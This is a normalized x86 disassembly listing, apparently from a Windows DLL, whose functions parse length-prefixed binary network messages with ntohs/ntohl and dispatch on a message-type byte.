test esi esi
je r-xdata
push ecx
mov ecx edi
call sub_1002d450
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ebx edx
shr ebx 0x1f
add ebx edx
cmp esi [ edi + 0x8 ]
jne r-xdata
mov esi [ edi + 0x4 ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x1b
test esi esi
je r-xdata
push ecx
mov ecx edi
call sub_1002d450
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ebx edx
shr ebx 0x1f
add ebx edx
cmp esi [ edi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x13
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x2c ] 0x10
jae r-xdata
mov eax [ edi ]
lea ecx [ ebx + ebx * 2 ]
mov esi [ edi + 0x4 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x58 ] esi
lea ebx [ eax + ecx * 8 ]
mov [ ebp - 0x4 ] 0x14
test esi esi
je r-xdata
push ecx
mov ecx edi
call sub_1002d450
mov [ ebp - 0x4 ] 0x18
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x14 ] 0x10
jae r-xdata
mov eax [ edi ]
lea ecx [ ebx + ebx * 2 ]
mov esi [ edi + 0x4 ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x5c ] esi
lea ebx [ eax + ecx * 8 ]
mov [ ebp - 0x4 ] 0x19
test esi esi
je r-xdata
push ecx
mov ecx edi
call sub_1002d450
mov ecx [ ebp + 0xc ]
mov eax 0x2aaaaaab
mov esi [ ebp + 0x8 ]
add ebx 0x18
inc [ ebp - 0x4c ]
sub ecx esi
imul ecx
mov [ ebp - 0x2c ] 0xf
sar edx 0x2
mov eax edx
mov [ ebp - 0x30 ] 0x0
shr eax 0x1f
add eax edx
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x48 ] ebx
cmp [ ebp - 0x4c ] eax
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x17
mov eax [ ebp - 0x40 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x16
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x30 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0x13
mov ebx [ ebp - 0x48 ]
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebx + 0x14 ] 0x10
jae r-xdata
mov ecx [ ebp + 0x18 ]
mov eax 0x2aaaaaab
mov esi [ ebp + 0x14 ]
add ebx 0x18
inc [ ebp - 0x4c ]
sub ecx esi
imul ecx
mov [ ebp - 0x14 ] 0xf
sar edx 0x2
mov eax edx
mov [ ebp - 0x18 ] 0x0
shr eax 0x1f
add eax edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x48 ] ebx
cmp [ ebp - 0x4c ] eax
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x1c
mov eax [ ebp - 0x28 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x1b
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x18 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0x18
mov ebx [ ebp - 0x48 ]
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebx + 0x14 ] 0x10
jae r-xdata
cmp [ ebx + esi + 0x14 ] 0x10
lea edx [ ebx + esi ]
jb r-xdata
mov ebx [ ebp - 0x44 ]
mov eax [ ebp - 0x30 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
push eax
lea eax [ ebp - 0x40 ]
push eax
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
add [ edi + 0x4 ] 0x18
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4 ] 0x15
mov eax [ ebx ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x14
mov [ ebx ] 0x0
mov eax [ ebx + 0x10 ]
inc eax
je r-xdata
cmp [ esi + ebx + 0x14 ] 0x10
lea edx [ esi + ebx ]
jb r-xdata
mov eax [ ebp - 0x18 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
add [ edi + 0x4 ] 0x18
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x1a
mov eax [ ebx ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x19
mov [ ebx ] 0x0
mov eax [ ebx + 0x10 ]
inc eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] 0x0
push eax
push ebx
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] 0x0
push eax
push ebx
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
sub_1002ead0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10004530
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1002eb30
push ebp
mov ebp esp
push 0xffffffff
push sub_10051ac0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x10 ] 0x1
jb r-xdata
xor esi esi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov esi 0x1
jmp r-xdata
cmp [ esi + 0x10 ] 0x7
jb r-xdata
mov bl [ eax ]
mov ecx esi
push 0x1
push 0x0
call sub_10001ae0
test bl bl
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
xor ebx ebx
xor edi edi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x64 ] edi
call sub_1002e090
test eax eax
je r-xdata
mov eax [ ecx ]
mov [ ebp - 0x18 ] eax
mov ax [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ax
mov al [ ecx + 0x6 ]
mov ecx esi
push 0x7
push 0x0
mov [ ebp - 0x12 ] al
call sub_10001ae0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x48 ]
mov ecx esi
call sub_1002e0d0
test eax eax
je r-xdata
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
xor eax eax
cmp ax [ ebp - 0x64 ]
jae r-xdata
push edi
push ebx
call sub_10004c10
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x68 ] 0x0
xor edi edi
xor eax eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x4
cmp [ esi + 0x10 ] 0x2
jb r-xdata
mov ebx [ ebp - 0x64 ]
lea ecx [ ecx ]
mov [ ebp - 0x4 ] 0x2
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_1002d230
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
mov edi [ ebp - 0x6c ]
push eax
push edi
call sub_10004c10
push edi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebx [ ebp - 0x70 ]
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
push [ ebp - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
inc edi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp di bx
jb r-xdata
push [ ebp - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
sub esp 0x18
lea eax [ ebp - 0x48 ]
mov ecx esp
mov [ ebp - 0x64 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x6
sub esp 0x18
mov ecx esp
mov [ ebp - 0x7c ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x7
sub esp 0xc
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x80 ] esp
mov ecx esp
push eax
call sub_100048b0
mov [ ebp - 0x4 ] 0x8
sub esp 0xc
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x78 ] esp
mov ecx esp
push eax
call sub_100048b0
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x74 ]
call sub_1002e1e0
add esp 0x48
mov [ ebp - 0x4 ] 0x2
mov esi [ ebp - 0x24 ]
test esi esi
je r-xdata
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x4 ] 0x5
lea edx [ ebp - 0x60 ]
mov ecx esi
call sub_1002e0d0
test eax eax
je r-xdata
movzx eax [ eax ]
push eax
call [ ntohs@IAT ]
push 0x2
movzx eax ax
mov ecx esi
push 0x0
mov [ ebp - 0x64 ] eax
call sub_10001ae0
xor eax eax
xor edi edi
cmp ax [ ebp - 0x64 ]
jae r-xdata
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x3
lea edx [ ebp - 0x30 ]
mov ecx esi
call sub_1002e0d0
test eax eax
je r-xdata
mov ebx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
call sub_10004c10
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4c ] 0x10
jb r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_1002d230
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4c ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push [ ebp - 0x6c ]
push ebx
call sub_10004c10
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x68 ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
inc edi
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
cmp di [ ebp - 0x64 ]
jb r-xdata
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002efa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051b3b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x10 ] 0x1
jb r-xdata
xor esi esi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor esi esi
lea edx [ ebp - 0x28 ]
mov ecx esi
call sub_1002e0d0
test eax eax
je r-xdata
mov bl [ eax ]
mov ecx esi
push 0x1
push 0x0
call sub_10001ae0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0x40 ]
mov ecx esi
call sub_1002e0d0
test eax eax
je r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp bl 0x4
jne r-xdata
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
jmp r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x34
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x4 ] 0x3
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
xor esi esi
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov esi esp
mov [ ebp - 0x54 ] esp
sub esp 0x18
mov ecx esp
mov [ ebp - 0x48 ] esp
push eax
call sub_10003600
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x4 ] 0x3
mov ecx esi
call sub_1003c240
mov [ ebp - 0x4 ] 0x5
mov esi esp
mov [ ebp - 0x48 ] esp
lea eax [ ebp - 0x40 ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x50 ] esp
push eax
call sub_10003600
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x4 ] 0x5
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x4 ] 0x3
mov ecx edi
call sub_10005800
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x2
sub esp 0x18
mov ecx esp
mov [ ebp - 0x50 ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x4 ] 0x2
mov ecx esi
call sub_1002dbc0
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x44 ]
push eax
add ecx 0x20
mov [ ebp - 0x44 ] esi
call sub_100038e0
mov esi 0x1
jmp r-xdata
sub_1002f1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051b80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call [ ntohs@IAT ]
push 0x2
push 0x0
lea ecx [ ebp + 0x8 ]
movzx esi ax
call sub_10001ae0
mov eax esi
xor edi edi
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp + 0x18 ] 0x1
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
push 0x1
cmovae eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
push 0x0
mov bl [ eax ]
call sub_10001ae0
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call [ ntohs@IAT ]
push 0x2
push 0x0
lea ecx [ ebp + 0x8 ]
movzx esi ax
call sub_10001ae0
cmp [ ebp + 0x18 ] esi
jb r-xdata
push esi
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp + 0x8 ]
push esi
push 0x0
call sub_10001ae0
test bl bl
jne r-xdata
cmp bl 0x1
jne r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] bl
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
call sub_1002eb30
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] bl
lea edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
call sub_1002efa0
add esp 0x18
test eax eax
je r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
inc edi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
cmp edi [ ebp - 0x30 ]
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
jmp r-xdata
sub_1002f3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051be0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov ecx [ ebp + 0x1c ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
cmp ecx 0x10
cmovae eax edx
mov bl [ eax ]
cmp esi 0x1
ja r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp ecx 0x10
lea edi [ ebp + 0x8 ]
cmovae edi edx
dec esi
je r-xdata
cmp ecx 0x10
mov [ ebp + 0x18 ] 0x0
lea eax [ ebp + 0x8 ]
cmovae eax edx
mov [ eax ] 0x0
jmp r-xdata
cmp ecx 0x10
mov [ ebp + 0x18 ] esi
lea eax [ ebp + 0x8 ]
cmovae eax edx
mov [ eax + esi ] 0x0
push esi
lea eax [ edi + 0x1 ]
push eax
push edi
call sub_1003c640
mov ecx [ ebp + 0x1c ]
add esp 0xc
mov edx [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] 0x4
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push [ eax ]
call [ ntohl@IAT ]
mov edi [ ebp + 0x18 ]
lea ecx [ ebp + 0x8 ]
mov esi eax
cmp edi 0x4
ja r-xdata
mov edx [ ebp + 0x1c ]
cmp edx 0x10
cmovae ecx [ ebp + 0x8 ]
add edi 0xfffffffc
je r-xdata
cmp [ ebp + 0x1c ] 0x10
mov [ ebp + 0x18 ] 0x0
cmovae ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
jmp r-xdata
cmp edx 0x10
mov [ ebp + 0x18 ] edi
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
mov [ eax + edi ] 0x0
push edi
lea eax [ ecx + 0x4 ]
push eax
push ecx
call sub_1003c640
mov edx [ ebp + 0x1c ]
add esp 0xc
cmp [ ebp + 0x18 ] esi
jb r-xdata
push esi
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10006fa0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp + 0x8 ]
push esi
push 0x0
call sub_10001ae0
cmp bl 0x3
jne r-xdata
cmp bl 0x4
jne r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x2c ]
call sub_1002dc40
jmp r-xdata
cmp bl 0x5
jne r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x2c ]
call sub_1002ddc0
jmp r-xdata
add esp 0x18
cmp bl 0x6
jne r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x2c ]
call sub_1002de80
jmp r-xdata
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
test esi esi
jne r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x2c ]
call sub_1002f1e0
sub_1002f6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051c40
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x4
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push [ eax ]
call [ ntohl@IAT ]
push 0x4
push 0x0
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_10001ae0
cmp [ ebp + 0x18 ] 0x10
mov [ edi + 0x54 ] esi
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x10
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10006fa0
